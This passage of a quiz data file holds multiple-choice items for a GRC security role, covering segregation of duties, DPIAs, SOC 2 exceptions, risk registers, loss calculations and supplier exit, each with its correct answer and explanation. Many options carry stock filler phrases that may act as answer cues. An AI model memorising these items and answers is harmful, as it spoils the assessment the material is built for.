    exhibit: "User: m.hart | Roles: VendorMaster-Create, PaymentRun-Approve | Last review: 2025-09-14 | Status: Approved",
    q: "A user can both create vendors and approve payments in the finance system. How should the review treat this?",
    options: ["As a system feature","As a minor issue","As normal for senior staff","As a segregation of duties conflict requiring removal or a compensating control, in most cases"],
    correct: 3, why: "Combining those rights enables fraud by a single person.",
    hint: "Conflicting rights."
  },
  {
    id: 470, rank: 1, role: "grc", topic: "Security Budget Case", difficulty: "INTERMEDIATE",
    q: "Which argument best supports a request for security funding to the board?",
    options: ["Risk reduction in business terms with costs, and options, as a general rule","The number of tools competitors use","A list of technical jargon","Fear of audits"],
    correct: 0, why: "Boards decide on risk, cost and benefit, not technology.",
    hint: "Business terms."
  },
  {
    id: 471, rank: 1, role: "grc", topic: "Records of Processing", difficulty: "INTERMEDIATE",
    q: "What does a record of processing activities describe?",
    options: ["The salary of each employee","What personal data is processed, why, by whom and where it goes","How many laptops the company owns","The network speed"],
    correct: 1, why: "Article 30 requires organisations to keep these records.",
    hint: "What, why, who, where."
  },
  {
    id: 472, rank: 1, role: "grc", topic: "Whistleblowing Channel", difficulty: "INTERMEDIATE",
    q: "Why should a company offer a confidential channel for reporting suspected misconduct?",
    options: ["It replaces audits","Staff may fear retaliation and not report problems otherwise","It reduces insurance","It avoids paperwork"],
    correct: 1, why: "Safe reporting routes expose fraud and control failures early.",
    hint: "Confidential and safe."
  },
  {
    id: 473, rank: 1, role: "grc", topic: "Metrics Quality", difficulty: "INTERMEDIATE",
    q: "A dashboard shows 99% of policies reviewed. The board still asks about real risk. What is the BEST improvement?",
    options: ["Add more pages","Remove the dashboard","Report only good news","Add outcome measures such as unresolved high risks and control failure trends"],
    correct: 3, why: "Activity metrics are the runner-up as they look complete, but they do not show exposure; outcome measures do.",
    hint: "Outcomes."
  },
  {
    id: 474, rank: 1, role: "grc", topic: "Contract Security Clauses", difficulty: "INTERMEDIATE",
    q: "Which clause is most important to include in a contract with a supplier handling confidential data?",
    options: ["Free coffee for staff","Breach notification duties, audit rights and data return or deletion at exit, in most cases","The supplier's favourite colours","A long logo license"],
    correct: 1, why: "Contracts must support incident handling, assurance and exit.",
    hint: "Notify, audit, exit."
  },
  {
    id: 475, rank: 1, role: "grc", topic: "BCP Testing", difficulty: "INTERMEDIATE",
    q: "What should be done when a recovery test shows the recovery time objective was missed?",
    options: ["Record the gap, fix the cause and retest","Hide the result, and revisit the decision after the next release","Cancel future tests","Change the objective to match the result without review"],
    correct: 0, why: "Tests exist to find gaps and drive improvement.",
    hint: "Fix and retest."
  },
  {
    id: 476, rank: 1, role: "grc", topic: "Data Mapping Value", difficulty: "INTERMEDIATE",
    q: "Why is a data flow map useful for compliance?",
    options: ["It shows where personal data goes so that risks and obligations can be assessed","It makes the website faster","It replaces the privacy notice","It lists staff passwords"],
    correct: 0, why: "Mapping exposes transfers, processors and storage locations.",
    hint: "Know the flows."
  },
  {
    id: 477, rank: 1, role: "grc", topic: "Security Committee", difficulty: "INTERMEDIATE",
    q: "What is the main purpose of a security governance committee?",
    options: ["Giving cross-functional oversight and decisions on risk and priorities","Replacing the security team, and revisit the decision after the next release","Approving holiday requests, and review the outcome at the next monthly meeting","Writing code"],
    correct: 0, why: "Governance forums align security with business and resolve conflicts.",
    hint: "Oversight."
  },
  {
    id: 478, rank: 1, role: "grc", topic: "Control Deficiency Rating", difficulty: "INTERMEDIATE",
    q: "What factor most increases the severity of a control deficiency?",
    options: ["The length of the finding","Its alphabetical order","Likelihood that it allows a material loss, and the lack of compensating controls, as a general rule","The auditor's mood"],
    correct: 2, why: "Severity reflects potential impact and whether other controls mitigate it.",
    hint: "Impact and mitigation."
  },
  {
    id: 479, rank: 1, role: "grc", topic: "Customer Assurance Requests", difficulty: "INTERMEDIATE",
    q: "A customer asks for a long security questionnaire. What is the best way to scale responses?",
    options: ["Maintain a reviewed answer library with evidence and a trust page","Ignore customers, and review the outcome at the next monthly meeting","Refuse all requests, and revisit the decision after the next release","Answer from memory"],
    correct: 0, why: "A maintained library saves time and ensures consistent accurate answers.",
    hint: "Reusable evidence."
  },
  {
    id: 480, rank: 1, role: "grc", topic: "Exit From a Supplier", difficulty: "INTERMEDIATE",
    q: "A company ends a contract with a cloud supplier that holds its customer data. Which step is essential?",
    options: ["Cancel the account, and assume the data has gone","Leave the data with the supplier in case it is needed later","Ask the supplier to email the data to the account manager, as a first step","Confirm secure return or deletion of the data with written evidence"],
    correct: 3, why: "Exit controls ensure data does not remain with a supplier without a legal basis or protection.",
    hint: "Prove deletion."
  },
  {
    id: 481, rank: 2, role: "grc", topic: "Annualised Loss Expectancy", difficulty: "ADVANCED",
    q: "A single loss event costs 200,000 and is expected twice every ten years. What is the annualised loss expectancy?",
    options: ["400,000, as the cost is doubled every year","40,000, in most cases","20,000, as the event happens ten times in two years","2,000,000, as the cost and frequency are multiplied"],
    correct: 1, why: "ALE is single loss expectancy multiplied by annual rate of occurrence: 200,000 x 0.2 = 40,000.",
    hint: "SLE times ARO."
  },
  {
    id: 482, rank: 2, role: "grc", topic: "Audit Opinion on Access Review", difficulty: "ADVANCED",
    exhibit: "Control AC-04 Quarterly access review\nSample size: 25 | Completed with evidence: 21 | Missing evidence: 4\nTolerable deviation: 0 for key controls",
    q: "An auditor tests 25 quarterly access reviews and finds 4 were not completed. Which conclusion is the best supported?",
    options: ["The control did not operate effectively, so report a deficiency","The control is effective as most reviews were done on time, and on schedule","The result is unknown until all four thousand users have been individually checked","No finding is needed as the sample was small, and incomplete for the whole year"],
    correct: 0, why: "A 16 percent exception rate exceeds typical tolerance, so the control operating effectiveness is rated deficient.",
    hint: "Exceptions in the sample."
  },
  {
    id: 483, rank: 2, role: "grc", topic: "SOC 2 Exception Impact", difficulty: "ADVANCED",
    exhibit: "Control CC6.2: User access is removed on termination within 24 hours.\nTest result: Exception noted in 6 of 40 samples; access removed after 8 to 30 days.\nManagement response: Process updated in Q3; retest scheduled.",
    q: "A vendor's SOC 2 Type 2 report notes an exception: terminated users kept access for up to 30 days. Your data is in scope. What is the BEST action?",
    options: ["Accept the vendor's verbal reassurance that the issue has been fixed for good","End the contract immediately","Ask for remediation evidence and assess compensating controls","Ignore it as the auditor still gave a clean opinion, in most cases"],
    correct: 2, why: "Ending the contract is the runner-up as it removes the risk, but it may be disproportionate; assess remediation and compensating controls first.",
    hint: "Assess, do not panic."
  },
  {
    id: 484, rank: 2, role: "grc", topic: "DPIA Outcome Decision", difficulty: "ADVANCED",
    q: "A DPIA concludes that a planned analytics project has high residual risk to individuals that cannot be mitigated. What is the BEST next step?",
    options: ["Ask the project to wait a month, and proceed, until the next scheduled review takes place","Remove the DPIA from the file, and revisit the decision after the next release","Consult the supervisory authority before processing begins, in most cases","Start anyway, and monitor complaints, until the next scheduled review takes place"],
    correct: 2, why: "Starting anyway is the runner-up since the business wants the project, but high unmitigated risk requires prior consultation.",
    hint: "Consult first."
  },
  {
    id: 485, rank: 2, role: "grc", topic: "Risk Register Aging", difficulty: "ADVANCED",
    exhibit: "ID   Risk                      Score  Owner     Due         Status\nR-02 Unpatched ERP         High   (none)    2025-06-30  Open\nR-05 Supplier no SOC 2     High   J. Patel  2025-05-31  Open - no update\nR-09 Printer firmware      Low    IT Ops    2026-12-31  Open\nR-12 Phishing exposure     Medium CFO       2026-03-31  Accepted",
    q: "Which finding in this register extract is the biggest governance concern?",
    options: ["Two high risks past due with no owner update","A medium risk accepted by the CFO, in most cases","A new risk with a draft score, as a general rule","A low risk with a review date scheduled for the middle of next year"],
    correct: 0, why: "Overdue high risks without ownership show that the treatment process is failing.",
    hint: "Overdue and unowned."
  },
  {
    id: 486, rank: 2, role: "grc", topic: "Segregation of Duties Matrix", difficulty: "ADVANCED",
    q: "Which role pair in this matrix presents the clearest SoD conflict?",
    options: ["Edit own profile and view calendar, as a general rule","Raise purchase request, and read policy","Create supplier and approve payment","Run report, and view dashboard, and review the outcome at the next monthly meeting"],
    correct: 2, why: "One person controlling both supplier creation and payment approval can commit undetected fraud.",
    hint: "Fraud pair."
  },
  {
    id: 487, rank: 2, role: "grc", topic: "Policy Conflict Resolution", difficulty: "ADVANCED",
    q: "The retention policy requires deleting logs at 90 days, but a regulator requires keeping transaction logs for 7 years. What is the best resolution?",
    options: ["Follow the policy, and ignore the regulation, as a general rule","Ignore the policy, and keep every log forever in case it is ever needed","Update the policy with a regulated-log exception","Ask each team to choose, and revisit the decision after the next release"],
    correct: 2, why: "Legal requirements override internal defaults, so the policy needs a documented exception by data type.",
    hint: "Law prevails, document it."
  },
  {
    id: 488, rank: 2, role: "grc", topic: "Third-Party Concentration Risk", difficulty: "ADVANCED",
    q: "Which finding best shows concentration risk in the supplier portfolio?",
    options: ["One supplier with a long contract","Many suppliers on small contracts, each of which supports a minor activity","Suppliers in several countries","Most critical services run on one cloud provider and region"],
    correct: 3, why: "A single point of failure across critical services creates systemic outage risk.",
    hint: "One dependency."
  },
  {
    id: 489, rank: 2, role: "grc", topic: "Business Impact Calculation", difficulty: "ADVANCED",
    q: "A payment system earns 50,000 per hour. The RTO is 4 hours and an outage actually lasts 9 hours. What revenue is lost beyond the tolerated outage?",
    options: ["100,000, as only half is lost","450,000, as the whole outage is excess","200,000, as the RTO period counts as revenue earned","250,000, in most cases"],
    correct: 3, why: "9 minus 4 equals 5 hours beyond the RTO, so 5 x 50,000 = 250,000.",
    hint: "Hours beyond RTO."
  },
  {
    id: 490, rank: 2, role: "grc", topic: "Control Maturity Gap", difficulty: "ADVANCED",
    q: "A framework assessment shows target maturity 4 and current maturity 2 for incident response. What should the GRC lead do?",
    options: ["Document the gap and set a funded plan with milestones","Wait until the next annual review to decide whether the gap matters at all","Change the target to 2","Hide the result, and review the outcome at the next monthly meeting"],
    correct: 0, why: "A measured gap needs an owned plan; lowering the target hides the issue.",
    hint: "Plan to close."
  },
  {
    id: 491, rank: 2, role: "grc", topic: "Evidence Reliability", difficulty: "ADVANCED",
    q: "Evidence for a patching control is a screenshot of a dashboard supplied by the system owner. What is the BEST improvement?",
    options: ["Use last year's evidence, and revisit the decision after the next release","Obtain a system report with timestamps and the full population","Accept the screenshot as it was supplied promptly","Ask the owner to describe the process in a meeting, and note what they say"],
    correct: 1, why: "A screenshot is the runner-up since it is quick, but it cannot show completeness; system reports allow independent sampling.",
    hint: "Complete and independent."
  },
  {
    id: 492, rank: 2, role: "grc", topic: "Cloud Responsibility Matrix", difficulty: "ADVANCED",
    q: "Under shared responsibility for an IaaS virtual machine, who is normally responsible for patching the guest operating system?",
    options: ["The hardware vendor","The internet service provider","The cloud provider","The customer"],
    correct: 3, why: "For IaaS the provider secures the infrastructure and the customer manages the guest OS and above.",
    hint: "Customer manages the OS."
  },
  {
    id: 493, rank: 2, role: "grc", topic: "Privacy Incident Assessment", difficulty: "ADVANCED",
    q: "Marketing emailed 5,000 customers with the wrong attachment containing another customer's name and address. What is the BEST first step?",
    options: ["Tell marketing to send an apology only, and skip any assessment of the data","Wait to see if anyone complains, until the next scheduled review takes place","Treat it as a minor mistake with no record, then record the result in the ticket","Contain it, record it and assess the risk to individuals, in most cases"],
    correct: 3, why: "Treating it as minor is the runner-up since the data is small, but every personal data breach must be recorded and assessed.",
    hint: "Record and assess."
  },
  {
    id: 494, rank: 2, role: "grc", topic: "Audit Finding Rating", difficulty: "ADVANCED",
    q: "A key control is missing, no compensating control exists and sensitive data is exposed. How should the finding be rated?",
    options: ["Informational","High","Low","Not reportable"],
    correct: 1, why: "Missing key control plus exposure and no compensation yields a high-risk rating.",
    hint: "Impact and no mitigation."
  },
  {
    id: 495, rank: 2, role: "grc", topic: "Regulatory Reporting Clock", difficulty: "ADVANCED",
    q: "An incident is detected on Monday 09:00 and confirmed as a notifiable breach on Tuesday 15:00. When does the 72-hour clock normally start?",
    options: ["From the end of the investigation, once the final report has been signed off","From when the press reports it","From when the organisation became reasonably certain of the breach","From the start of the attack"],
    correct: 2, why: "The period runs from awareness, meaning reasonable certainty that a breach affecting personal data occurred.",
    hint: "Awareness."
  },
  {
    id: 496, rank: 2, role: "grc", topic: "Vendor Offboarding", difficulty: "ADVANCED",
    q: "Which evidence best shows a former supplier no longer holds company data?",
    options: ["The invoice","A signed deletion certificate with scope, date and verification","A contract renewal letter sent by the supplier's sales team at the year end","A promise by email"],
    correct: 1, why: "Deletion evidence closes the data lifecycle.",
    hint: "Certificate and scope."
  },
  {
    id: 497, rank: 2, role: "grc", topic: "Control Design Versus Operation", difficulty: "ADVANCED",
    q: "A policy requires encryption of laptops, but no tool enforces or reports it. Which weakness is this?",
    options: ["An excellent control","An irrelevant observation","A control design gap because nothing ensures it operates","An operating effectiveness pass in which every sample was completed on time"],
    correct: 2, why: "Without enforcement and monitoring, the control cannot be shown to work.",
    hint: "Design gap."
  },
  {
    id: 498, rank: 2, role: "grc", topic: "KPI Misinterpretation", difficulty: "ADVANCED",
    q: "Patching compliance shows 97 percent but the missing 3 percent are all internet-facing servers. What is the BEST view?",
    options: ["Ignore the missing servers as they are a small share of the estate","Report exposure by criticality, as the unpatched servers carry the most risk, as a first step","Remove the metric","Report success as 97 percent exceeds target, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Reporting success is the runner-up as the headline meets target, but risk is concentrated where exposure is greatest.",
    hint: "Weight by risk."
  },
  {
    id: 499, rank: 2, role: "grc", topic: "Insurance Questionnaire", difficulty: "ADVANCED",
    q: "The insurer asks if MFA is enforced for all remote access, but it applies only to staff, not contractors. What is the correct answer?",
    options: ["State the gap accurately and show the remediation plan","Skip the question","Answer yes","Ask the contractors to say nothing about how they sign in to the network"],
    correct: 0, why: "Accurate disclosure avoids invalid cover and supports remediation.",
    hint: "Be accurate."
  },
  {
    id: 500, rank: 2, role: "grc", topic: "Exception Review", difficulty: "ADVANCED",
    exhibit: "EXC-118 | Legacy FTP server | Approved: 2025-01-10 | Expiry: 2025-04-10 | Owner: A. Cole | Status: Active | Last review: none",
    q: "An exception granted for 90 days is still active after 14 months. What should GRC do?",
    options: ["Let it continue silently, until the next scheduled review takes place","Extend it automatically","Escalate to the risk owner for renewal with justification or closure","Delete the record, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Expired exceptions must be re-approved or ended.",
    hint: "Expired means re-decide."
  },
  {
    id: 501, rank: 2, role: "grc", topic: "Compliance Mapping Gap", difficulty: "ADVANCED",
    q: "A new customer demands ISO 27001 controls that map to existing SOC 2 controls except for supplier management. What is the best action?",
    options: ["Refuse the customer, and review the outcome at the next monthly meeting","Assess the gap and add supplier management controls and evidence","Rename existing controls, and revisit the decision after the next release","Claim full compliance"],
    correct: 1, why: "A gap analysis identifies missing controls to implement.",
    hint: "Close the gap."
  },
  {
    id: 502, rank: 2, role: "grc", topic: "Board Risk Report", difficulty: "ADVANCED",
    q: "A quarterly board paper lists 140 risks. What is the BEST improvement?",
    options: ["Publish raw data, and review the outcome at the next monthly meeting","Add the remaining details as an annex, and review the outcome at the next monthly meeting","Remove all numbers, and review the outcome at the next monthly meeting","Show top risks against appetite with trends and decisions needed"],
    correct: 3, why: "Adding more detail is the runner-up as it feels thorough, but boards need prioritised decisions.",
    hint: "Top risks and decisions."
  },
  {
    id: 503, rank: 2, role: "grc", topic: "Data Residency Requirement", difficulty: "ADVANCED",
    q: "A contract requires customer data to stay in the EU. Backups replicate to a US region. What is the finding?",
    options: ["Compliant, as backups do not count","Not a finding","Non-compliance with data residency that needs configuration change or a customer agreement, in most cases","A usability issue"],
    correct: 2, why: "Backups contain the data and fall within residency obligations.",
    hint: "Backups count."
  },
  {
    id: 504, rank: 2, role: "grc", topic: "Training Gap Analysis", difficulty: "ADVANCED",
    q: "Phishing reports are rising but click rate by finance staff stays at 14 percent. What is the best targeted action?",
    options: ["Do nothing","Role-specific training, and simulation for finance, as a general rule","Repeat the generic annual course for every employee in the whole company","Ban email"],
    correct: 1, why: "Targeted interventions address the highest-risk group.",
    hint: "Target the group."
  },
  {
    id: 505, rank: 2, role: "grc", topic: "Control Redundancy Review", difficulty: "ADVANCED",
    q: "Three overlapping controls detect the same risk, but none covers privileged access. What is the best governance finding?",
    options: ["Accept the gap","Remove all controls","Rebalance controls to cover the uncovered risk, and rationalise overlaps","Add a fourth overlapping control, and revisit the decision after the next release"],
    correct: 2, why: "Effective control design aligns coverage to risk.",
    hint: "Coverage over count."
  },
  {
    id: 506, rank: 2, role: "grc", topic: "Breach Cost Disclosure", difficulty: "ADVANCED",
    q: "How should an organisation treat the cost estimates it gives to executives after a breach?",
    options: ["Give a single exact figure at once, and review the outcome at the next monthly meeting","Present ranges with assumptions and update them as facts emerge, in most cases","Avoid giving any figure","Use the competitor's number, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Estimates are uncertain early on, so assumptions must be explicit.",
    hint: "Ranges and assumptions."
  },
  {
    id: 507, rank: 2, role: "grc", topic: "Risk Owner Challenge", difficulty: "ADVANCED",
    q: "A business owner rates a system risk as low because 'we've never been attacked'. What is the BEST response?",
    options: ["Challenge the rating using threat information and control evidence and document the outcome","Remove the risk","Accept the rating to maintain good relations, and review the outcome at the next monthly meeting","Raise the rating without discussion"],
    correct: 0, why: "Accepting it is the runner-up as owners know the business, but absence of past attacks is not evidence of low risk.",
    hint: "Evidence not history."
  },
  {
    id: 508, rank: 2, role: "grc", topic: "Control Evidence Retention", difficulty: "ADVANCED",
    q: "How long should audit evidence be kept?",
    options: ["For the period required by the framework, regulation and contracts, in most cases","One week","Until a laptop is replaced","Forever"],
    correct: 0, why: "Retention follows legal and assurance requirements.",
    hint: "Follow requirements."
  },
  {
    id: 509, rank: 2, role: "grc", topic: "Material Weakness", difficulty: "ADVANCED",
    q: "Which condition most clearly describes a material weakness in internal control?",
    options: ["A deficiency where a material misstatement or loss is reasonably possible and not prevented or detected","A typo in a policy","A late meeting","A missing logo"],
    correct: 0, why: "A material weakness is a serious deficiency that could cause significant loss or error to go undetected.",
    hint: "Material impact."
  },
  {
    id: 510, rank: 2, role: "grc", topic: "Contractual Liability", difficulty: "ADVANCED",
    exhibit: "Clause 14.2: Supplier's total liability under this agreement shall not exceed the fees paid in the preceding 12 months (EUR 24,000).",
    q: "A supplier contract caps liability at the annual fee, but a breach could cost far more. What should the customer do?",
    options: ["Accept the cap silently, and review the outcome at the next monthly meeting","Ignore the contract","Switch off the supplier, and review the outcome at the next monthly meeting","Negotiate higher liability for data breaches or add insurance requirements"],
    correct: 3, why: "Contract terms should reflect the risk the customer carries.",
    hint: "Match terms to risk."
  },
  {
    id: 511, rank: 2, role: "grc", topic: "Incident Review Governance", difficulty: "ADVANCED",
    q: "What should a post-incident governance review verify?",
    options: ["That root causes are fixed and actions have owners and deadlines","That the team worked overtime","That the press release was long","That the SIEM is new"],
    correct: 0, why: "Reviews must result in tracked corrective actions.",
    hint: "Closed actions."
  },
  {
    id: 512, rank: 2, role: "grc", topic: "Whistleblower Trend", difficulty: "ADVANCED",
    q: "Reports to the ethics line about security shortcuts increase. What is the right governance response?",
    options: ["Identify the reporters, then record the result in the ticket","Dismiss them","Block the line, and review the outcome at the next monthly meeting","Investigate themes confidentially and fix systemic causes"],
    correct: 3, why: "Trends indicate cultural or process weaknesses.",
    hint: "Treat as signals."
  },
  {
    id: 513, rank: 2, role: "grc", topic: "Data Classification Audit", difficulty: "ADVANCED",
    q: "An audit finds confidential files stored in a public cloud folder. What is the best remediation?",
    options: ["Rename the folder, and revisit the decision after the next release","Notify nobody, and review the outcome at the next monthly meeting","Delete the audit finding","Restrict access, review exposure and enforce labelling and DLP"],
    correct: 3, why: "Controls must stop exposure and prevent recurrence.",
    hint: "Fix exposure and cause."
  },
  {
    id: 514, rank: 2, role: "grc", topic: "Policy Exception Metrics", difficulty: "ADVANCED",
    q: "Which indicator best shows policy exception management is healthy?",
    options: ["Many open exceptions","Few exceptions past expiry and all with named owners","Exceptions approved verbally","No exceptions ever recorded"],
    correct: 1, why: "Healthy governance keeps exceptions time-bound and owned.",
    hint: "Expiry and owners."
  },
  {
    id: 515, rank: 2, role: "grc", topic: "Control Self-Assessment", difficulty: "ADVANCED",
    q: "What is the main weakness of relying only on control self-assessments?",
    options: ["They require no evidence","Owners may rate their own controls too favourably","They are illegal","They are always accurate"],
    correct: 1, why: "Self-assessment needs challenge and sampling to be reliable.",
    hint: "Bias."
  },
  {
    id: 516, rank: 2, role: "grc", topic: "Resilience Reporting", difficulty: "ADVANCED",
    q: "Which measure best shows operational resilience for a critical service?",
    options: ["Tested recovery time against the impact tolerance","Length of the plan","Number of backups","Number of staff"],
    correct: 0, why: "Resilience is shown by tested recovery within tolerance.",
    hint: "Tested recovery."
  },
  {
    id: 517, rank: 2, role: "grc", topic: "Merger Due Diligence", difficulty: "ADVANCED",
    q: "A company acquires a smaller firm with no security programme. What is the BEST first governance step?",
    options: ["Trust their statement","Connect networks immediately","Ignore until year-end","Assess its security posture and data, then plan integration with interim controls, as soon as practical"],
    correct: 3, why: "Connecting networks is the runner-up for speed, but it imports unknown risk.",
    hint: "Assess before connecting."
  },
  {
    id: 518, rank: 2, role: "grc", topic: "Records Management", difficulty: "ADVANCED",
    q: "A user deletes records subject to a legal hold. What should the organisation have done?",
    options: ["Deleted backups","Asked the user to restore them later","Applied the hold technically, and told custodians not to delete, in most cases","Nothing"],
    correct: 2, why: "Legal holds need enforced preservation.",
    hint: "Preserve."
  },
  {
    id: 519, rank: 2, role: "grc", topic: "Ethics of Monitoring", difficulty: "ADVANCED",
    q: "The company plans to monitor employee messages for data loss. What governance step is essential?",
    options: ["Monitor everything forever, and review the outcome at the next monthly meeting","Share reports widely","Install it secretly","Assess proportionality and privacy impact, inform staff and limit access"],
    correct: 3, why: "Monitoring must be lawful, transparent and proportionate.",
    hint: "Proportionate and transparent."
  },
  {
    id: 520, rank: 2, role: "grc", topic: "Subprocessor Change Notice", difficulty: "ADVANCED",
    q: "A processor informs you it will add a new subprocessor in another country. What should the controller do under its data processing agreement?",
    options: ["Review the change and object or require safeguards if risks are not acceptable","Ignore the notice","Delete the agreement","Approve without reading"],
    correct: 0, why: "Controllers keep oversight of subprocessors and transfers.",
    hint: "Review and decide."
  },
  {
    id: 521, rank: 3, role: "grc", topic: "Three Lines Model", difficulty: "EXPERT",
    q: "A company's internal audit team also designs and operates key controls. What is the main governance concern?",
    options: ["Faster control implementation by the audit team","Lower audit fees for the business units","More engagement from the board","Loss of independence in the third line"],
    correct: 3, why: "Internal audit should provide independent assurance and not own the controls it reviews.",
    hint: "Independence."
  },
  {
    id: 522, rank: 3, role: "grc", topic: "FAIR Risk Quantification", difficulty: "EXPERT",
    q: "The board wants cyber risk expressed in financial terms. What is the BEST approach?",
    options: ["Convert every colour on the heat map into a single exact dollar figure","Quantify loss event frequency and magnitude as ranges using a model such as FAIR","Ask each business unit to estimate a figure without any method or data","Use the cost of the security budget as the measure of risk exposure, as a first step"],
    correct: 1, why: "A single exact figure is the runner-up since it is easy to present, but false precision misleads; ranges with stated assumptions are more credible.",
    hint: "Ranges, not point values."
  },
  {
    id: 523, rank: 3, role: "grc", topic: "Continuous Control Monitoring", difficulty: "EXPERT",
    q: "Which design best supports continuous compliance instead of annual evidence gathering?",
    options: ["A yearly spreadsheet filled in by owners the week before the audit","A shared folder where teams upload screenshots when they remember, as a general rule","Automated evidence from systems mapped to controls with alerts on failure","A request to auditors to accept written statements instead of evidence, in most cases"],
    correct: 2, why: "Automated collection reduces effort, improves accuracy and exposes failures between audits.",
    hint: "Automate evidence."
  },
  {
    id: 524, rank: 3, role: "grc", topic: "Policy Architecture", difficulty: "EXPERT",
    q: "A company has 140 overlapping policies that nobody reads. What is the best redesign?",
    options: ["Add more policies for every new situation that staff raise, until the next scheduled review takes place","Consolidate into a layered set of policy, standards and procedures with owners","Translate the existing policies into more languages for staff, as a general rule","Remove all policies, and rely on common sense in each team"],
    correct: 1, why: "A concise layered structure with ownership is easier to maintain, understand and audit.",
    hint: "Layer and own."
  },
  {
    id: 525, rank: 3, role: "grc", topic: "Risk Appetite Statement", difficulty: "EXPERT",
    q: "The board approves a high-level appetite statement but managers cannot apply it. What is the BEST improvement?",
    options: ["Replace it with a longer narrative statement about the company values, as a general rule","Ask managers to interpret it individually, and record their view","Withdraw the statement until the next strategy cycle begins","Translate it into measurable tolerances and thresholds per risk category"],
    correct: 3, why: "Longer narrative is the runner-up since it adds context, but without measurable thresholds nobody can tell when appetite is exceeded.",
    hint: "Measurable tolerances."
  },
  {
    id: 526, rank: 3, role: "grc", topic: "Assurance Mapping", difficulty: "EXPERT",
    q: "Several teams audit the same controls while other risks have no assurance. What is the best fix?",
    options: ["Add another audit team to cover the controls that the other teams already test","Let each team decide on its own which controls it wants to test each quarter","Build an assurance map across the lines and plan by risk","Cancel all of the planned audits for a year, and review the position afterwards"],
    correct: 2, why: "Mapping assurance avoids duplication and gaps.",
    hint: "Map assurance."
  },
  {
    id: 527, rank: 3, role: "grc", topic: "AI Governance Framework", difficulty: "EXPERT",
    q: "A company starts using generative AI across departments. Which first governance step is most important?",
    options: ["Define approved uses, data rules, owners and a risk assessment","Buy the most expensive AI platform available, and roll it out to every team","Let each department choose any tool it likes without approval from the centre","Ban all use of AI permanently without any review of the possible benefits"],
    correct: 0, why: "Clear ownership and data rules enable safe adoption while controlling risk.",
    hint: "Rules and owners."
  },
  {
    id: 528, rank: 3, role: "grc", topic: "Privacy Engineering Integration", difficulty: "EXPERT",
    q: "How should privacy requirements reach the product development lifecycle?",
    options: ["As a poster in the office kitchen that explains the principles of privacy","As design requirements and automated checks in delivery pipelines","As an annual email sent to all engineers reminding them about data protection","As a long document handed to the developers at the very end of the project"],
    correct: 1, why: "Embedding requirements in delivery makes privacy repeatable and testable.",
    hint: "Build it in."
  },
  {
    id: 529, rank: 3, role: "grc", topic: "Third-Party Programme Scaling", difficulty: "EXPERT",
    q: "A company has 2,000 suppliers and one analyst. What is the BEST way to scale third-party risk management?",
    options: ["Assess only suppliers whose names are familiar","Stop assessing suppliers and rely on contracts only, and review the outcome at the next monthly meeting","Tier suppliers by risk and automate low-risk assessments while focusing manual effort on critical ones","Assess all suppliers in the same depth over several years, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Uniform depth is the runner-up since it is fair, but it spreads effort too thin; risk-tiering focuses scarce effort where harm is highest.",
    hint: "Tier and automate."
  },
  {
    id: 530, rank: 3, role: "grc", topic: "Regulatory Overlap", difficulty: "EXPERT",
    q: "A global company faces overlapping privacy and cyber laws. What is the most efficient compliance design?",
    options: ["A common control baseline with regional addenda for specific requirements","Separate programmes per country with no coordination, and review the outcome at the next monthly meeting","Meet only the weakest law","Ignore laws outside headquarters"],
    correct: 0, why: "A unified baseline plus local variations reduces duplication.",
    hint: "Baseline and addenda."
  },
  {
    id: 531, rank: 3, role: "grc", topic: "Exception Governance Design", difficulty: "EXPERT",
    q: "Exceptions are granted informally and never expire. Which design best fixes this?",
    options: ["A central register with owners, expiry and automatic reminders","A rule that no exceptions are ever allowed under any circumstances in the business","A verbal approval process for urgent cases handled by the line manager","A yearly clean-up of the exceptions by the external auditor at the audit visit"],
    correct: 0, why: "Visible, time-bound, owned exceptions keep risk controlled.",
    hint: "Central and expiring."
  },
  {
    id: 532, rank: 3, role: "grc", topic: "Cyber Insurance Strategy", difficulty: "EXPERT",
    q: "How should cyber insurance fit in the risk strategy?",
    options: ["As the only response that the company needs to prepare for ransomware events","As a substitute for security investment, as the insurer will pay for any loss","As a way to avoid reporting incidents to regulators, and customers afterwards","As one part of risk transfer once exposure is understood"],
    correct: 3, why: "Insurance transfers residual financial risk but does not remove obligations or reduce attack likelihood.",
    hint: "Residual risk only."
  },
  {
    id: 533, rank: 3, role: "grc", topic: "ISMS Scope Definition", difficulty: "EXPERT",
    q: "A company defines its ISO 27001 scope to include only one small office to simplify certification. Customers expect the whole service to be covered. What is the BEST response?",
    options: ["Define scope from the services and data customers rely on and justify any exclusions","Expand the scope to include the office kitchen","Remove the exclusions, and avoid recording the reason","Keep the small scope and advertise it as company-wide certification, then record the result in the ticket"],
    correct: 0, why: "A narrow scope is the runner-up as it eases audits, but misrepresenting coverage misleads customers.",
    hint: "Scope reflects reality."
  },
  {
    id: 534, rank: 3, role: "grc", topic: "KRI Design", difficulty: "EXPERT",
    q: "Which KRI design principle makes indicators most useful?",
    options: ["Each is reported once a year to the board in the annual report to shareholders","Each uses the same threshold value for every team whatever its risk profile","Each has a threshold, an owner and an agreed action","Each is chosen as the data is easy for the team to collect each month"],
    correct: 2, why: "Indicators drive action only when thresholds and responses are defined.",
    hint: "Threshold and action."
  },
  {
    id: 535, rank: 3, role: "grc", topic: "Audit Plan Prioritisation", difficulty: "EXPERT",
    q: "How should an annual internal audit plan be prioritised?",
    options: ["By alphabetical order of the department names in the organisational chart","By the preferences of the audit staff, and the projects they enjoy working on","By repeating last year's order of audits without considering any changes","By risk to objectives, business change and assurance gaps, in most cases"],
    correct: 3, why: "Risk-based planning directs limited resources to the most significant exposures.",
    hint: "Risk-based."
  },
  {
    id: 536, rank: 3, role: "grc", topic: "Operational Resilience Mapping", difficulty: "EXPERT",
    q: "What should a resilience programme map for each important business service?",
    options: ["Only the name of the owner, and the date on which the service was first launched","Only the annual budget that the owner has been given for the service","People, process, technology, data and suppliers it depends on, in most cases","Only the servers that it uses, as they are the most expensive item to replace"],
    correct: 2, why: "End-to-end dependencies show where disruption would break the service.",
    hint: "Map dependencies."
  },
  {
    id: 537, rank: 3, role: "grc", topic: "Data Governance Link", difficulty: "EXPERT",
    q: "Why should security governance be linked to data governance?",
    options: ["Security governance replaces privacy and data protection duties in the organisation, as a general rule","They are unrelated disciplines that report to different executives in most companies","Data governance replaces the need for any security controls on the systems involved, as a general rule","Protection depends on data classification, ownership and lifecycle, as a general rule"],
